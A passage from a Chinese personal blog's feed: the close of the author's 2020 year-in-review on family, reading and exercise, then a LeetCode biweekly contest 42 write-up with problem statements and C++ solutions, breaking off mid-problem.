title="读书学习"></a>读书学习</h4><ul><li>年终给自己定了很多目标，完成情况只能说差强人意。坚持锻炼身体和学习，才能积极的面对这个时代变换带来的不确定性。以前总是想着找捷径，找到一个永久的办法来解决人生中的苦难和痛苦，然而经历的越多，越觉得人生本来就没有什么一劳永逸的解决办法，只有每天坚持锻炼好身体，终生坚持学习和交流，跟上时代潮流，这才是真正能够解决人生困惑的正道。然后长期的自律，实际上对很多人难说很难坚持，因为养成习惯很难，放弃很容易。就像今年坚持的规律运动一年，坚持几个月效果非常好，然而一次以外的感冒和健身房游泳馆的关门，就将自己近半年养成的规律锻炼习惯全部打乱，冬天又这么冷，不自然而然就想放弃健身锻炼了。</li><li>关于读书方面，今年下半年的目标本来计划是读<code>30</code>本书，然而最后一个月因为工作的原因，全部打乱读书计划，最终只完成了<code>19</code>本左右，并且读完这些书之后，感觉精品的书太少，新的一年计划读书<code>50</code>本，并且要仔细挑选精品书籍。<br><img src="https://i.loli.net/2021/01/03/6KtbRwgZWdnEUYa.png" alt></li><li>关于技术方面的学习，每周还是坚持刷题，今年感觉基本上坚持完成了全年所有的<code>leetcode</code>的题解，感觉收获还是挺大，不过每次的<code>contes</code>还是有<code>50%</code>的概率做不出来<code>hard</code>难度的题目，不过感觉对技术的理解又有了新的高度。不过其余的两个平台<code>atcoder</code>和<code>codeforces</code>主要是因为题目难度太大，自己确实没有多少时间来思考上面的题目。只能说<code>leetcode</code>的难度偏小，基本上一个小时都可以搞定，而自己不像学生时代有那么多的时间和精力来刷题。</li><li>关于技术课程方面，今年完成的公开课的课程真心不少，不过确实限制于时间的问题，自己没有很多时间来完成大的<code>project</code>，只能抽时间完成小的<code>project</code>，国外公开课的每个<code>project</code>的难度都好大，感觉比工作的难度大多了，毕竟工作中遇到问题，到处都是求助的资源，而国外的这些<code>project</code>好多基本上没有求助的资源，靠自己一个人独立完成真心很难。特别是《build a computer》系列课程，到了后期一个<code>project</code>的难度太大了，基本上不仔细思索的话，业余根本就没有时间来完成这么大的<code>project</code>. 自我评价来说，自己真心不是脑袋特别好使的人才，唯一一点的长度就是觉得自己非常能够坚持，希望新的一年能够按照自己制定的目标来完成自己的计划安排。<br><img src="https://i.loli.net/2021/01/03/82bxe3npSuzjyC4.png" alt></li></ul><h4 id="展望"><a href="#展望" class="headerlink" title="展望"></a>展望</h4><ul><li>展望2021年，首先希望家里两个可爱的宝宝健康成长，父母能够身体健康，自己身体健康工作顺利，老婆顺利升职，顺利换个学区房，乘着岁月静好好好享受生活。</li><li>希望自己能够实现自己所定的小目标，积极改善家庭经济条件，改善父母关系，改善夫妻之间的关系。<br><img src="https://i.loli.net/2021/01/03/CtWu1sOmFTh7zjk.png" alt></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;2020总结&quot;&gt;&lt;a href=&quot;#2020总结&quot; class=&quot;headerlink&quot; title=&quot;2020总结&quot;&gt;&lt;/a&gt;2020总结&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;转眼间2020年已经过去了，时间过的飞快，很快就迎接了2021年，回首2020年收获了许多，也失去了许多，我想这一年应该是觉得人生中最为难忘和艰难的一年，这也是为自己正式踏入中年苦逼人生中最浓重的一笔。这一年经历了人生中第一个最重大疫情，在家休过最长的长假，家中的两个宝贝一天天在长大，变化最大的就是自己的宝贝女儿，可爱的像朵花一样，每天回家最开心的就是看见儿子和女儿。工作中也迎来了最艰难和责任最重大的一年，工作上只能说还凑合。这一年在健身和学习上进步了许多。&lt;br&gt;&lt;a href=&quot;http://mikemeng.org/2020/01/02/118/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;2019年总结&lt;/a&gt;&lt;br&gt;&lt;a href=&quot;http://mikemeng.org/2020/07/05/177/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;2020年下半年计划&lt;/a&gt;&lt;h4 id=&quot;生活流水账&quot;&gt;&lt;a href=&quot;#生活流水账&quot; class=&quot;headerlink&quot; title=&quot;生活流水账&quot;&gt;&lt;/a&gt;生活流水账&lt;/h4&gt;&lt;/li&gt;
&lt;li&gt;2月至4月期间，经历了人生中遇到过第一次最严重的疫情，后果是基本上快三个月都呆在家里不能出门，不能锻炼身体，真心的感觉生活很压抑。再也不想重新来一遍，这么束缚的生活，每天吃了睡和睡了吃的生活真心也是一种负担。&lt;/li&gt;
&lt;li&gt;5月到8月，基本上每天都是在家里看娃，每天家里两个娃吵吵闹闹，忙的不亦乐乎。七月以后感觉不能再这样昏昏耗耗下去了，重新制定了学习计划，健身计划，坚持按照目标来执行。&lt;/li&gt;
&lt;li&gt;8月又经历了父亲了病重，只能请年家回了趟老家，安顿好父亲，父亲经过两个星期的治疗，身体逐步有所好转，只能暂时将老父亲安顿在姐姐家。这个年纪了，父亲一天天老去，能陪伴他的日子越来越少了，我只能尽自己最大的努力给他尽好孝心。能抽空回家就尽量抽空回家看望老父亲。&lt;/li&gt;
&lt;li&gt;9月到11月基本上时间稍微闲暇一些，按照自己的学习进度和目标，安排了许多学习的计划和锻炼身体的计划，目前基本达成自己的初步目标。&lt;/li&gt;
&lt;li&gt;12月份年底的工作压力特别大，因为要在年底前完成许多的工作，忙的不可开交，终于迎来了稍微轻松的元旦，之道此时才又机会和空闲来总结和整理下不平凡的2020年。&lt;h4 id=&quot;家庭&quot;&gt;&lt;a href=&quot;#家庭&quot; class=&quot;headerlink&quot; title=&quot;家庭&quot;&gt;&lt;/a&gt;家庭&lt;/h4&gt;&lt;/li&gt;
&lt;li&gt;今年变化最快的是小宝，今年已经一岁半了。从一个婴儿终于成长了一个可爱粉嫩的小公主了，刚开始只会漫天爬的婴儿，变成了每天会骑滑板车和捣乱的小天使了。每天都是粉嫩的脸蛋和天真无辜的眼神，让人忍不住怜爱，每天都要亲爸爸，亲妈妈。&lt;br&gt;&lt;img src=&quot;https://i.loli.net/2021/01/03/zaZPQMxqiILOEmV.jpg&quot; alt&gt;&lt;br&gt;&lt;img src=&quot;https://i.loli.net/2021/01/03/IJwR9pKsDZrlbkN.jpg&quot; alt&gt;&lt;/li&gt;
&lt;li&gt;大宝今年已经满4岁了，并且顺利的上了中班，从以前连字都吐不清楚，到现在可以清晰的表达自己的想法，现在也可以正常的更人交流了，变化真的很大。作为父母的感慨时间过的真快，同时也感慨生命的神奇，转眼间小伙子长大了。几年前还是个小男宝，丫丫学语，啥都不会，转眼间技能树已经快速点满。同时也意识到，儿女一天天长大，终有一天他们会离我们远去去追寻他们的梦想，那时作为父母的只能放手让他们去拼搏，无论人生道路上又多么艰难，父母无无怨无悔的支持你们，爸爸妈妈永远都是你们坚强的后盾。&lt;br&gt;&lt;img src=&quot;https://i.loli.net/2021/01/03/qGClBQbfv7Xs2Tg.jpg&quot; alt=&quot;1&quot;&gt;&lt;/li&gt;
&lt;li&gt;依稀还记得某日清晨醒来，看见一对儿女熟睡得样子，真心让人怜惜。我总是会幻想，女儿长大以后会是什么样子，儿子长大后会是什么样子，作为父亲得我，才刚步入中年，就已经开始幻想几十年后得光阴，不得不让人感慨，时间是个神奇的武器，丫丫细语的幼儿已经成了葱郁的少年；岁月也是把杀猪刀，青葱的少年转眼间已成了油腻的中年。&lt;br&gt;&lt;img src=&quot;https://i.loli.net/2021/01/03/49KonJzR3WSmDUQ.jpg&quot; alt&gt;&lt;/li&gt;
&lt;li&gt;老父亲今年已经76岁高龄了，父亲年龄越来越大了，目前基本上每年都会生一次重病，需要住院。今年稍微安顿好了一些，把老夫请安顿在姐姐家，所有的开支费用由我来承担，主要担心老人年纪过大，身边又没人照看，万一出现意外，那真心是悔过，顺便也能姐姐照顾一下小外甥。2021年准备换好房子，能把老父亲接到武汉来住几天，真心感觉结婚以后，基本上个人都被家庭和工作缠身，能给老父亲分担的时间和精力越来越少，新的一年也祝愿老父亲身体硬朗。&lt;/li&gt;
&lt;li&gt;姐姐自从离婚后，生活上也出现了许多困难，先是经历了骨折，后又经历了搬家，工作上也是非常的辛苦，大外甥马上也要中考了，姐夫是肯定指望不上了，毕竟他不参与家庭生活，不知道生活的难处，希望她能在未来的生活中照顾好自己，照顾好家庭。&lt;/li&gt;
&lt;li&gt;最后是老婆，岳父，岳母。LD的工作压力真心大，连续两个月基本上周末都在加班中度过，感觉跟着自己太不容易了，体制内的工作，工资待遇福利没多少，加班出差少不了，有时候不免心神怨气，周末还要忙着学车，忙着社区下沉，还要照顾两个孩子的饮食起居，还要忙着干家务，想想都头大，中年最难熬的时光，希望能够坚持下去，也要照顾好身体。对于岳父母，自己感觉也是亏欠很多，岳父每天早出晚归，这么大年龄了还需要经常熬夜上夜班，岳母今年大病了一场，自然而然的不免有些自责，望着岳父母都有些花白的头发，内心不自然而然的自责，没能给他们一个好的经济基础让他们安详晚年。&lt;/li&gt;
&lt;li&gt;对于自身来说，其实内心非常的焦虑。因为在自己最需要金钱的时候，而没有能力提供一个很好的经济基础，能够让自己的家人过上幸福的日子。有时候因为自己的臭脾气也让爱人，岳父母承担了许多不必要的麻烦，真心要给他们说一声道歉。新的一年争取，让岳父母和老婆能够出国游玩一趟，能够每个月定期给他们一部分零花钱，定期组织家里出去聚餐和游玩一次，给老婆办一个健身卡，给岳父母买一个重疾保险，这是自己在这一年的目标。&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
    
      <category term="职场" scheme="http://yoursite.com/categories/%E8%81%8C%E5%9C%BA/"/>
    
    
      <category term="职场经验" scheme="http://yoursite.com/tags/%E8%81%8C%E5%9C%BA%E7%BB%8F%E9%AA%8C/"/>
    
  </entry>
  
  <entry>
    <title>【Leetcode】  双周赛42场</title>
    <link href="http://yoursite.com/2020/12/28/238/"/>
    <id>http://yoursite.com/2020/12/28/238/</id>
    <published>2020-12-28T02:21:57.958Z</published>
    <updated>2020-12-29T14:46:08.144Z</updated>
    
    <content type="html"><![CDATA[<h1 id="leetcode-biweekly-contest-42"><a href="#leetcode-biweekly-contest-42" class="headerlink" title="leetcode  biweekly contest 42"></a>leetcode  biweekly contest 42</h1><p>双周赛的题目看似题目很简单，但是难度还是不小。</p><h2 id="5621-无法吃午餐的学生数量"><a href="#5621-无法吃午餐的学生数量" class="headerlink" title="5621. 无法吃午餐的学生数量"></a>5621. 无法吃午餐的学生数量</h2><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p>学校的自助午餐提供圆形和方形的三明治，分别用数字 <code>0</code>和 <code>1</code> 表示。所有学生站在一个队列里，每个学生要么喜欢圆形的要么喜欢方形的。<br>餐厅里三明治的数量与学生的数量相同。所有三明治都放在一个 栈 里，每一轮：</p><a id="more"></a><ul><li>如果队列最前面的学生 喜欢 栈顶的三明治，那么会 拿走它 并离开队列。</li><li>否则，这名学生会 放弃这个三明治 并回到队列的尾部。<br>这个过程会一直持续到队列里所有学生都不喜欢栈顶的三明治为止。</li></ul><p>给你两个整数数组 <code>students</code> 和 <code>sandwiches</code> ，其中 <code>sandwiches[i]</code>是栈里面第 i​​​​​​ 个三明治的类型（i = 0 是栈的顶部）， <code>students[j]</code>是初始队列里第 j​​​​​​ 名学生对三明治的喜好（j = 0 是队列的最开始位置）。请你返回无法吃午餐的学生数量。</p><p>示例 1：<br><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">输入：students = [<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>], sandwiches = [<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>]</span><br><span class="line">输出：<span class="number">0</span> </span><br><span class="line">解释：</span><br><span class="line">- 最前面的学生放弃最顶上的三明治，并回到队列的末尾，学生队列变为 students = [<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>]。</span><br><span class="line">- 最前面的学生放弃最顶上的三明治，并回到队列的末尾，学生队列变为 students = [<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>]。</span><br><span class="line">- 最前面的学生拿走最顶上的三明治，剩余学生队列为 students = [<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>]，三明治栈为 sandwiches = [<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>]。</span><br><span class="line">- 最前面的学生放弃最顶上的三明治，并回到队列的末尾，学生队列变为 students = [<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>]。</span><br><span class="line">- 最前面的学生拿走最顶上的三明治，剩余学生队列为 students = [<span class="number">1</span>,<span class="number">0</span>]，三明治栈为 sandwiches = [<span class="number">0</span>,<span class="number">1</span>]。</span><br><span class="line">- 最前面的学生放弃最顶上的三明治，并回到队列的末尾，学生队列变为 students = [<span class="number">0</span>,<span class="number">1</span>]。</span><br><span class="line">- 最前面的学生拿走最顶上的三明治，剩余学生队列为 students = [<span class="number">1</span>]，三明治栈为 sandwiches = [<span class="number">1</span>]。</span><br><span class="line">- 最前面的学生拿走最顶上的三明治，剩余学生队列为 students = []，三明治栈为 sandwiches = []。</span><br><span class="line">所以所有学生都有三明治吃。</span><br></pre></td></tr></table></figure><br>示例 2：<br><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入：students = [<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>], sandwiches = [<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>]</span><br><span class="line">输出：<span class="number">3</span></span><br></pre></td></tr></table></figure></p><p>提示：</p><ul><li><code>1 &lt;= students.length, sandwiches.length &lt;= 100</code></li><li><code>students.length == sandwiches.length</code></li><li><code>sandwiches[i]</code> 要么是 0 ，要么是 1 。</li><li><code>students[i]</code>要么是 0 ，要么是 1 。</li></ul><h3 id="地址"><a href="#地址" class="headerlink" title="地址"></a>地址</h3><p><a href="https://leetcode-cn.com/problems/number-of-students-unable-to-eat-lunch" target="_blank" rel="noopener">https://leetcode-cn.com/problems/number-of-students-unable-to-eat-lunch</a></p><h3 id="题意"><a href="#题意" class="headerlink" title="题意"></a>题意</h3><blockquote><p>  直接用队列模拟</p><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><ol><li>简单题目，因为题目的复杂度很低，所以我们直接用队列模拟即可，非常加单。</li><li>变换一种思路来看，学生的队列无论如何变换，如果当前剩余的学生中只有存在当前栈顶的元素，则学生一定能够取走栈顶的元素，所以我们只需要每次对栈顶的元素减<code>1</code>操作即可，直到当前栈顶的元素没有则返回剩余的学生的数目。<h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">countStudents</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; students, <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; sandwiches)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; cnt(<span class="number">2</span>);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">auto</span> v : students)&#123;</span><br><span class="line">            cnt[v]++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">auto</span> v : sandwiches)&#123;</span><br><span class="line">            <span class="keyword">if</span>(cnt[v] &gt; <span class="number">0</span>) cnt[v]--;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> cnt[<span class="number">0</span>] + cnt[<span class="number">1</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li></ol></blockquote><h2 id="5622-平均等待时间"><a href="#5622-平均等待时间" class="headerlink" title="5622. 平均等待时间"></a>5622. 平均等待时间</h2><h3 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h3><p>有一个餐厅，只有一位厨师。你有一个顾客数组 <code>customers</code>，其中 <code>customers[i] = [arrivali, timei]</code> ：</p><ul><li><code>arrivali</code> 是第 i 位顾客到达的时间，到达时间按 非递减 顺序排列。</li><li><code>timei</code> 是给第 i 位顾客做菜需要的时间。<br>当一位顾客到达时，他将他的订单给厨师，厨师一旦空闲的时候就开始做这位顾客的菜。每位顾客会一直等待到厨师完成他的订单。厨师同时只能做一个人的订单。厨师会严格按照 订单给他的顺序 做菜。</li></ul><p>请你返回所有顾客需要等待的 平均 时间。与标准答案误差在 10-5 范围以内，都视为正确结果。</p><p>示例 1：<br><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">输入：customers = [[<span class="number">1</span>,<span class="number">2</span>],[<span class="number">2</span>,<span class="number">5</span>],[<span class="number">4</span>,<span class="number">3</span>]]</span><br><span class="line">输出：<span class="number">5.00000</span></span><br><span class="line">解释：</span><br><span class="line"><span class="number">1</span>) 第一位顾客在时刻 <span class="number">1</span> 到达，厨师拿到他的订单并在时刻 <span class="number">1</span> 立马开始做菜，并在时刻 <span class="number">3</span> 完成，第一位顾客等待时间为 <span class="number">3</span> - <span class="number">1</span> = <span class="number">2</span> 。</span><br><span class="line"><span class="number">2</span>) 第二位顾客在时刻 <span class="number">2</span> 到达，厨师在时刻 <span class="number">3</span> 开始为他做菜，并在时刻 <span class="number">8</span> 完成，第二位顾客等待时间为 <span class="number">8</span> - <span class="number">2</span> = <span class="number">6</span> 。</span><br><span class="line"><span class="number">3</span>) 第三位顾客在时刻 <span class="number">4</span> 到达，厨师在时刻 <span class="number">8</span> 开始为他做菜，并在时刻 <span class="number">11</span> 完成，第三位顾客等待时间为 <span class="number">11</span> - <span class="number">4</span> = <span class="number">7</span> 。</span><br><span class="line">平均等待时间为 (<span class="number">2</span> + <span class="number">6</span> + <span class="number">7</span>) / <span class="number">3</span> = <span class="number">5</span> 。</span><br></pre></td></tr></table></figure><br>示例 2：<br><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">输入：customers = [[<span class="number">5</span>,<span class="number">2</span>],[<span class="number">5</span>,<span class="number">4</span>],[<span class="number">10</span>,<span class="number">3</span>],[<span class="number">20</span>,<span class="number">1</span>]]</span><br><span class="line">输出：<span class="number">3.25000</span></span><br><span class="line">解释：</span><br><span class="line"><span class="number">1</span>) 第一位顾客在时刻 <span class="number">5</span> 到达，厨师拿到他的订单并在时刻 <span class="number">5</span> 立马开始做菜，并在时刻 <span class="number">7</span> 完成，第一位顾客等待时间为 <span class="number">7</span> - <span class="number">5</span> = <span class="number">2</span> 。</span><br><span class="line"><span class="number">2</span>) 第二位顾客在时刻 <span class="number">5</span> 到达，厨师在时刻 <span class="number">7</span> 开始为他做菜，并在时刻 <span class="number">11</span> 完成，第二位顾客等待时间为 <span class="number">11</span> - <span class="number">5</span> = <span class="number">6</span> 。</span><br><span class="line"><span class="number">3</span>) 第三位顾客在时刻 <span class="number">10</span> 到达，厨师在时刻 <span class="number">11</span> 开始为他做菜，并在时刻 <span class="number">14</span> 完成，第三位顾客等待时间为 <span class="number">14</span> - <span class="number">10</span> = <span class="number">4</span> 。</span><br><span class="line"><span class="number">4</span>) 第四位顾客在时刻 <span class="number">20</span> 到达，厨师拿到他的订单并在时刻 <span class="number">20</span> 立马开始做菜，并在时刻 <span class="number">21</span> 完成，第四位顾客等待时间为 <span class="number">21</span> - <span class="number">20</span> = <span class="number">1</span> 。</span><br><span class="line">平均等待时间为 (<span class="number">2</span> + <span class="number">6</span> + <span class="number">4</span> + <span class="number">1</span>) / <span class="number">4</span> = <span class="number">3.25</span> 。</span><br></pre></td></tr></table></figure></p><p>提示：</p><ul><li><code>1 &lt;= customers.length &lt;= 105</code></li><li><code>1 &lt;= arrivali, timei &lt;= 104</code></li><li><code>arrivali &lt;= arrivali+1</code></li></ul><h3 id="地址-1"><a href="#地址-1" class="headerlink" title="地址"></a>地址</h3><p><a href="https://leetcode-cn.com/problems/average-waiting-time" target="_blank" rel="noopener">https://leetcode-cn.com/problems/average-waiting-time</a></p><h3 id="题意-1"><a href="#题意-1" class="headerlink" title="题意"></a>题意</h3><blockquote><p> 直接模拟</p><h3 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h3><ol><li>记录当前任务的结束时间，然后减去当前任务的加入时间，求出当前任务的等待时间。<h3 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">double</span> <span class="title">averageWaitingTime</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt;&amp; customers)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = customers.size();</span><br><span class="line">        <span class="keyword">long</span> <span class="keyword">long</span> sum = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> curr = customers[<span class="number">0</span>][<span class="number">0</span>];</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; wait;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">auto</span> v : customers)&#123;</span><br><span class="line">            <span class="keyword">int</span> x = v[<span class="number">0</span>];</span><br><span class="line">            <span class="keyword">int</span> y = v[<span class="number">1</span>];</span><br><span class="line">            <span class="keyword">if</span>(curr &gt;= x)&#123;</span><br><span class="line">                curr += y;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                curr = x + y;</span><br><span class="line">            &#125;</span><br><span class="line">            sum += curr-x;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">double</span>(sum)/n;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li></ol></blockquote><h2 id="1702-修改后的最大二进制字符串"><a href="#1702-修改后的最大二进制字符串" class="headerlink" title="1702. 修改后的最大二进制字符串"></a>1702. 修改后的最大二进制字符串</h2><p>给你一个二进制字符串 <code>binary</code> ，它仅有 0 或者 1 组成。你可以使用下面的操作任意次对它进行修改：</p><ul><li>操作 1 ：如果二进制串包含子字符串 “00” ，你可以用 “10” 将其替换。<br>比方说， “00010” -&gt; “10010”</li><li>操作 2 ：如果二进制串包含子字符串 “10” ，你可以用 “01” 将其替换。<br>比方说， “00010” -&gt; “00001”<br>请你返回执行上述操作任意次以后能得到的 最大二进制字符串 。如果二进制字符串 x 对应的十进制数字大于二进制字符串 y 对应的十进制数字，那么我们称二进制字符串 x 大于二进制字符串 y 。</li></ul><p>示例 1：<br><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">输入：binary = <span class="string">"000110"</span></span><br><span class="line">输出：<span class="string">"111011"</span></span><br><span class="line">解释：一个可行的转换为：</span><br><span class="line"><span class="string">"000110"</span> -&gt; <span class="string">"000101"</span> </span><br><span class="line"><span class="string">"000101"</span> -&gt; <span class="string">"100101"</span> </span><br><span class="line"><span class="string">"100101"</span> -&gt; <span class="string">"110101"</span> </span><br><span class="line"><span class="string">"110101"</span> -&gt; <span class="string">"110011"</span> </span><br><span class="line"><span class="string">"110011"</span> -&gt; <span class="string">"111011"</span></span><br></pre></td></tr></table></figure><br>示例 2：<br><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入：<span class="keyword">binary </span>= <span class="string">"01"</span></span><br><span class="line">输出：<span class="string">"01"</span></span><br><span class="line">解释：<span class="string">"01"</span> 没办法进行任何转换。</span><br></pre></td></tr></table></figure></p><p>提示：</p><ul><li><code>1 &lt;= binary.length &lt;= 105</code></li><li><code>binary</code> 仅包含 ‘0’ 和 ‘1’ 。</li></ul><h3 id="地址-2"><a href="#地址-2" class="headerlink" title="地址"></a>地址</h3><p><a href="https://leetcode-cn.com/problems/maximum-binary-string-after-change" target="_blank" rel="noopener">https://leetcode-cn.com/problems/maximum-binary-string-after-change</a></p><h3 id="题意-2"><a href="#题意-2" class="headerlink" title="题意"></a>题意</h3><blockquote><p> 贪心算法</p><h3 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h3><ol><li>这个题目时典型的数学智力题，当初思考了很长时间，竟然没有想到非常简单的思路。最后看了@lee215的答案，真心觉得很强，思路非常简洁明了。</li><li>我们可以应用操作二,将字符串中所有的<code>0</code>全部移到到最左边，将字符串中所有的<code>1</code>都移到最右边，<code>00000...1111</code>.</li><li>此时我们可以利用规则<code>1</code>将左边边连续的<code>0</code>转换为<code>1</code>,直到还剩下最后一个<code>0</code>为止。即此时：<br><code>0000...1111</code>-&gt;<code>11111...01111</code><h3 id="代码-2"><a href="#代码-2" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="built_in">string</span> <span class="title">maximumBinaryString</span><span class="params">(<span class="built_in">string</span> A)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = A.size();</span><br><span class="line">        <span class="keyword">int</span> zeros = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> ones = <span class="number">0</span>;</span><br><span class="line">        <span class="built_in">string</span> res;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; ++i) res.push_back(<span class="string">'1'</span>);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; ++i)&#123;</span><br><span class="line">            <span class="keyword">if</span>(A[i] == <span class="string">'0'</span>)&#123;</span><br><span class="line">                zeros++;</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(zeros == <span class="number">0</span>)&#123;</span><br><span class="line">                ones++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(ones &lt; n)&#123;</span><br><span class="line">            res[ones+zeros<span class="number">-1</span>] = <span class="string">'0'</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li></ol></blockquote><h2 id="1703-得到连续-K-个-1-的最少相邻交换次数"><a href="#1703-得到连续-K-个-1-的最少相邻交换次数" class="headerlink" title="1703. 得到连续 K 个 1 的最少相邻交换次数"></a>1703. 得到连续 K 个 1 的最少相邻交换次数</h2><h3 id="题目-2"><a href="#题目-2" class="headerlink" title="题目"></a>题目</h3><p>给你一个整数数组 <code>nums</code> 和一个整数 <code>k</code> 。 <code>nums</code> 仅包含 0 和 1 。每一次移动，你可以选择 相邻 两个数字并将它们交换。</p><p>请你返回使 <code>nums</code> 中包含 <code>k</code>个 连续 1 的 最少 交换次数。</p><p>示例 1：<br><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入：nums = [<span 